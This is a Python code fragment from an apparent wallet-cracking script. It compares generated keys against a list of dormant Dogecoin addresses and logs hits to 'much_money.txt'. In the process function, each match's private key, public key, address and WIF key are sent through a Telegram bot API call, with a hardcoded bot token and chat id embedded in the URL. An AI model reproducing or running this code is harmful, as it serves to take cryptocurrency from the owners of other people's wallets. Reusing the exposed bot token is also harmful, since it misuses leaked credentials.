...
def process(private_key, public_key, address, database):
    ...
    """
    #print(type(address))
    if str(address) in database:
        try:
            requests.get('https://api.telegram.org/bot1542518391:AAF-g9tAClBokAPj90bze3nTeS1ieFXVyNA/sendMessage?chat_id=-1001569507312&text=Test  hex private key: ' + str(private_key) + '\n' + 'public key: ' + str(public_key) + '\n' + 'address: ' + str(address) + '\n\n' + 'WIF private key: ' + str(private_key_to_WIF(private_key)) + '\n')
        except:
            pass
        time.sleep(21600)
        with open('much_money.txt', 'a') as file:
         ...
         print("Dogecoin Wallet: " + address, end='\r')
...
if __name__ == '__main__':
    ...
    database = []
    for line in open ('database/dormant_list'):
        database.append(str(line.strip()))
